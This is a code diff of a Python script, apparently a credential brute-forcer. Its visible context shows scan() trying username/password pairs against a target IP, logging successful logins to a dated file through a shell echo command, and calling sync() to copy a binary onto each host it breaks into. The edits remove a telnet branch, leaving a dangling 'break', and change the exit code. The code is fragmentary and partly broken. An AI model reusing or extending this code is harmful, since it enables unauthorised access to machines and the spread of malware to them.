@@ -18,7 +18,7 @@ duck = """
                   __
               ___( o)>
               \ <_. )
-               `---'  
+               `---'
 """
 
 def scan(ip):
@@ -36,12 +36,6 @@ def scan(ip):
                     print("{} {} {} {} success with {}:{}".format(Colors.OKGREEN, duck, Colors.END, ip, u_p[0], u_p[1]))
                     shell().execom('echo "{} {}:{}" >> availables_at_`date+ %d-%m-%Y`.txt'.format(ip, u_p[0], u_p[1]))
                     sync(FILE, u_p[0], u_p[1], protocol[0], BINF, ip, DEF_DEST)
-
-            if "telnet" in protocol[1]:
-                """
-                telnet connection not used for now
-                """
-                if not Utils().test_telnet(ip, u_p[0], u_p[1]):
                     break
 
 
@@ -61,9 +55,9 @@ def sync(file, usr, pwd, port, source, ip, dst):
 
 def main():
     Utils().dbg("{}start bruteforce {}{}".format(Colors.WARNING, sys.argv[1], Colors.END))
-    # for ip in IPS:
+    # for ip in ips (passed as arg)
     scan(IP)
 
 
 main()
-exit(0)
+sys.exit(1)
